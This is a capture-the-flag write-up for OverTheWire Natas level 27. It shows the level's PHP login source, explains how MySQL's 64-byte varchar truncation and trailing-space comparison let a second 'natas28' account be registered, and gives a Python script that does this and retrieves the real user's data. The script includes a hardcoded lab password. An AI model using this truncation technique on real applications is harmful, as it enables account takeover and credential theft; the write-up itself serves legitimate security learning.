# Writeup level 27
In this challenge we are greeted by a login form.

**Source Code**  
```php
<?

// morla / 10111
// database gets cleared every 5 min 


/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/


function checkCredentials($link,$usr,$pass){
 
    $user=mysql_real_escape_string($usr);
    $password=mysql_real_escape_string($pass);
    
    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysql_query($query, $link);
    if(mysql_num_rows($res) > 0){
        return True;
    }
    return False;
}


function validUser($link,$usr){
    
    $user=mysql_real_escape_string($usr);
    
    $query = "SELECT * from users where username='$user'";
    $res = mysql_query($query, $link);
    if($res) {
        if(mysql_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}


function dumpData($link,$usr){
    
    $user=mysql_real_escape_string($usr);
    
    $query = "SELECT * from users where username='$user'";
    $res = mysql_query($query, $link);
    if($res) {
        if(mysql_num_rows($res) > 0) {
            while ($row = mysql_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!  
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
}


function createUser($link, $usr, $pass){

    $user=mysql_real_escape_string($usr);
    $password=mysql_real_escape_string($pass);
    
    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysql_query($query, $link);
    if(mysql_affected_rows() > 0){
        return True;
    }
    return False;
}


if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas27', '<censored>');
    mysql_select_db('natas27', $link);
   

    if(validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }        
    } 
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){ 
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysql_close($link);
} else {
?> 
```
As we can see in the source code, our input is getting sanitized by a function called **mysql_real_escape_string**. Googling that function and looking up some possible exploit, I can conclude that the way of exploiting that function won't work in this scenario. Altough there is one function that seems a bit weird (**dumpData**). It is weird to me because it prints an array, so my initial thought was what if I can manipulate that array by injecting another user called natas28 so it also gives me his data (which I obviously want). After trying for some time and reading abit into php I came to the conclusion that it won't work. So I started to look at the whole code again. I noticed that this time the table was created by using a size of 64 bytes for varchar and by reasearching I found out that when your input is longer than 64 bytes (in this case) then it will cut it off. So a String for instance:  
"A"*64 + "cutOff"
should look like that:  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcutOff  
But what mysql does when I use that as an input:  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
It cuts it off.  
So what if we have the following user:  
username: "user"  
password: "secret"  
The select query:  
```SQL
SELECT * FROM users WHERE username=user;  
```
Would obviously give us that user. But what if we create another user and his username is going to be "user   "(user+3spaces).  
The select query would actually return both users. 

**Exploit**  
Knowing this we can try to create a user called natas28 with a lot of spaces and some text which will get cutted anyway. This way we can create a unique user natas28 with our own password and that would gives us the password for natas28.

```python
import requests

def return_post_request(username, password):
	url = "http://natas27.natas.labs.overthewire.org/"
	auth = ("natas27", "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ")
	data = {
		'username': username,
		'password': password
	}

	return requests.post(url, data=data, auth=auth)

username = "natas28" + (200*" " + "baldy")
password = "baldyspw"
#inject our own natas28 user with our password
r1 =return_post_request(username, password)
print(r1.text[760:])

username = "natas28"

r2 = return_post_request(username, password)
print(r2.text[760:])
```
